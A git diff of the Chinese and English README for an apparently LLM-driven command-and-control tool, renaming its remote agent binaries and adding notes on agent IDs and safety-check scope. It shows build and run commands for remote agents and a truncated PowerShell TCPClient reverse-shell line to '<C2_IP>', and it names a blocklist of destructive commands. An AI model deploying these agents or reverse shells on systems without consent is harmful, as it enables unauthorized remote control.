@@ -141,9 +141,9 @@ build\build_all.bat         # Windows
 
 ```bash
 # Linux / macOS
-gcc -O2 -Wall -Wextra -o irudo_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
+gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
 # Windows (MinGW-w64)
-gcc -O2 -Wall -Wextra -o irudo_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
+gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
 ```
 
 #### 7.4 Python 受控端
@@ -160,11 +160,11 @@ python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 -
 
 ```bash
 cd remote/remote-go
-go build -o irudo_remote .                                   # 当前平台
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o irudo_remote_linux_amd64 .   # 交叉编译
+go build -o c2agent_remote .                                   # 当前平台
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o c2agent_remote_linux_amd64 .   # 交叉编译
 ```
 
-> `remote/remote-go` 是**独立 go module**（`module irudo_remote`），零三方依赖；从仓库根执行 `go build ./...` 不会包含它。
+> `remote/remote-go` 是**独立 go module**（`module c2agent_remote`），零三方依赖；从仓库根执行 `go build ./...` 不会包含它。
 
 #### 7.6 一次构建全部目标（控制端 + Go 受控端）
 
@@ -177,11 +177,11 @@ build\build_all.bat     # Windows
 
 | 目标 | 控制端 | Go 受控端 |
 | ---- | ------ | --------- |
-| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/irudo_remote_windows_amd64.exe` |
-| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/irudo_remote_windows_386.exe` |
-| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/irudo_remote_linux_amd64` |
-| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/irudo_remote_linux_386` |
-| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/irudo_remote_linux_arm64` |
+| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/c2agent_remote_windows_amd64.exe` |
+| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/c2agent_remote_windows_386.exe` |
+| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/c2agent_remote_linux_amd64` |
+| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/c2agent_remote_linux_386` |
+| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/c2agent_remote_linux_arm64` |
 
 > 说明：`linux_x86-64` 与 `linux_amd64` 若都指 64 位 x86 则为同一目标；上表额外提供了 32 位 x86（`386`）目标。
 
@@ -200,9 +200,9 @@ cp config_c2.example.json config_c2.json    # 填写 llm.api_base / api_key / mo
 
 ```bash
 # C（推荐）
-./irudo_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
+./c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 # Go
-./remote/remote-go/irudo_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
+./remote/remote-go/c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 # Python
 python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 ```
@@ -217,6 +217,8 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 ```
 
 连上后，Web/CLI 中会同时出现 `server-01`（Native）与 `BOT-001`（Shell）。
+
+> ⚠️ **`--agent-id` 必须每台受控端唯一**（如 `server-01`、`server-02`）。C2 以 agent_id 为键，同一 id 的新连接会顶掉旧连接（用于断线重连）；若两台机器共用同一 id，二者会互相顶掉并持续重连抖动。
 
 ### 9. 配置说明（`config_c2.json`）
 
@@ -289,6 +291,8 @@ go test ./...
 - Native 使用挑战-响应鉴权 + ChaCha20 全流量加密；Shell 端口**无鉴权**，请仅在内网/VPN 使用。
 - Web 面板默认仅监听 `127.0.0.1`；公网部署请加 SSH 隧道或反向代理 + 鉴权。
 - 授权模式与安全检查（`rm -rf /`、`format c:`、`mkfs.` 等）用于降低风险，但非生产级防护。
+- 安全检查与授权**仅作用于 LLM 生成的动作**；CLI/Web 中操作员的直连命令与文件操作不受约束（操作员即授权方）。
+- Shell 受控端通过 `uname` / PowerShell / `sw_vers` 探测 OS；纯 `cmd.exe` 且无 PowerShell 的目标会被判为 Unknown 而无法使用。
 - 本工具仅供个人/受信环境使用。
 
 ---
@@ -421,9 +425,9 @@ build\build_all.bat         # Windows
 
 ```bash
 # Linux / macOS
-gcc -O2 -Wall -Wextra -o irudo_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
+gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
 # Windows (MinGW-w64)
-gcc -O2 -Wall -Wextra -o irudo_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
+gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
 ```
 
 #### 7.4 Python agent
@@ -441,11 +445,11 @@ python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 -
 
 ```bash
 cd remote/remote-go
-go build -o irudo_remote .                                  # current platform
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o irudo_remote_linux_amd64 .  # cross-compile
+go build -o c2agent_remote .                                  # current platform
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o c2agent_remote_linux_amd64 .  # cross-compile
 ```
 
-> `remote/remote-go` is an **independent go module** (`module irudo_remote`) with zero
+> `remote/remote-go` is an **independent go module** (`module c2agent_remote`) with zero
 > third-party deps; `go build ./...` from the repo root does not include it.
 
 #### 7.6 Build all targets at once (control end + Go agent)
@@ -459,11 +463,11 @@ Outputs land in `dist/`, all **statically compiled, `CGO_ENABLED=0`, no external
 
 | Target | Control end | Go agent |
 | ------ | ----------- | -------- |
-| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/irudo_remote_windows_amd64.exe` |
-| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/irudo_remote_windows_386.exe` |
-| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/irudo_remote_linux_amd64` |
-| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/irudo_remote_linux_386` |
-| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/irudo_remote_linux_arm64` |
+| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/c2agent_remote_windows_amd64.exe` |
+| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/c2agent_remote_windows_386.exe` |
+| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/c2agent_remote_linux_amd64` |
+| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/c2agent_remote_linux_386` |
+| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/c2agent_remote_linux_arm64` |
 
 > Note: `linux_x86-64` and `linux_amd64` are the same target if both mean 64-bit x86;
 > the table additionally provides the 32-bit x86 (`386`) target.
@@ -483,9 +487,9 @@ cp config_c2.example.json config_c2.json    # fill in llm.api_base / api_key / m
 
 ```bash
 # C (recommended)
-./irudo_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
+./c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 # Go
-./remote/remote-go/irudo_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
+./remote/remote-go/c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 # Python
 python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
 ```
@@ -500,6 +504,8 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 ```
 
 Registered agents appear as `server-01` (Native) and `BOT-001` (Shell).
+
+> ⚠️ **`--agent-id` must be unique per controlled end** (e.g. `server-01`, `server-02`). The C2 keys agents by id and a new connection with an existing id replaces the old one (intended for reconnects); two hosts sharing one id will repeatedly evict each other.
 
 ### 9. Configuration reference (`config_c2.json`)
 
@@ -574,4 +580,6 @@ and snapshot pending serialization.
 - Native uses challenge-response auth + full-stream ChaCha20. The shell listener is **unauthenticated** — use it only on a trusted network/VPN.
 - The Web panel binds to `127.0.0.1` by default; for public exposure add an SSH tunnel or reverse proxy + auth.
 - Authorization modes and safety checks (`rm -rf /`, `format c:`, `mkfs.`, ...) reduce risk but are not production-grade protection.
+- Safety checks and authorization apply to **LLM-generated actions only**; an operator's direct commands and file operations from the CLI/Web are not constrained (the operator is the authorizer).
+- Shell bots probe the OS via `uname` / PowerShell / `sw_vers`; a pure `cmd.exe` host without PowerShell is reported as Unknown and unusable.
 - For personal / trusted-environment use only.
